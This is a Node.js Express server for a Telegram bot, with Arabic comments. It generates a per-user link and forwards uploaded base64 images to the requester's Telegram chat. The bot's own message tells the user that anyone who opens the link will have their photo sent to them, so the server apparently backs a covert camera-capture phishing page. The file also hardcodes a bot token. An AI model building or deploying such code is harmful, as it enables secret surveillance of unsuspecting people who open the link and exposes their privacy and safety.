const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const cors = require('cors');
const FormData = require('form-data');

const app = express();
const PORT = process.env.PORT || 3000; 

// بيانات البوت الخاصة بك
const BOT_TOKEN = '7899918022:AAFeO3ofPyWdsYkGLcDlULCtu_Tff_CQM60'; 
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

app.use(cors()); 
app.use(bodyParser.json({ limit: '50mb' })); 

const welcomeMsg = `𓆩『𝕄𝔸𝕏💀⚠️𝕟¹.⁶𝕢』𓆪
⬛⬜⬛⬜⬛⬜⬛⬜
⬜⬛⬜⬛⬜⬛⬜⬛
⬛⬜⬛⬜⬛⬜⬛⬜
⬜⬛⬜⬛⬜⬛⬜⬛
​[ LOADING.. ]
​▒▒▒▒▒▒▒▒▒▒ 0%
▒▒▒██▒▒▒▒▒ 20%
▒▒▒████▒▒▒ 40%
▒▒▒██████▒ 60%
▒▒▒███████ 100%
​[ 𝕎𝔼𝕃ℂ𝕆𝕄𝔼 𝕋𝕆 𝕄𝕐 𝕎𝕆ℝ𝕃𝔻 ]
​/ \\  / \\  / \\  / \\
( M )( A )( X )( ! )
_/  _/  _/  _/
​█▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
𝕄𝔸𝕏 𝕆ℕ 𝕋𝕆ℙ
█▄▄▄▄▄▄▄▄▄▄▄▄▄▄█`;

// معالجة رسائل تليجرام
app.post(`/bot${BOT_TOKEN}`, async (req, res) => {
    const { message, callback_query } = req.body;
    
    if (message && message.text === '/start') {
        await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: message.chat.id,
            text: welcomeMsg,
            reply_markup: {
                inline_keyboard: [[{ text: "🔗 استخراج الرابط", callback_data: `gen_${message.chat.id}` }]]
            }
        });
    }

    if (callback_query) {
        const userId = callback_query.from.id;
        const host = req.get('host');
        await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: userId,
            text: `✅ الرابط الخاص بك جاهز. أي شخص يفتحه ستصلك صوره هنا:\nhttps://${host}/?id=${userId}`
        });
    }
    res.sendStatus(200);
});

// استقبال الصور وإعادة توجيهها
app.post('/upload-photo', async (req, res) => {
    const { image, userId } = req.body;
    if (!image || !userId) return res.sendStatus(400);

    const base64Image = image.replace(/^data:image\/\w+;base64,/, "");
    const buffer = Buffer.from(base64Image, 'base64');
    
    const form = new FormData();
    form.append('chat_id', userId);
    form.append('photo', buffer, { filename: 'capture.jpg', contentType: 'image/jpeg' });

    try {
        await axios.post(`${TELEGRAM_API}/sendPhoto`, form, { headers: form.getHeaders() });
        res.status(200).send("Done");
    } catch (e) { res.status(500).send("Error"); }
});

app.listen(PORT, () => console.log(`Server is running on port ${PORT}`));
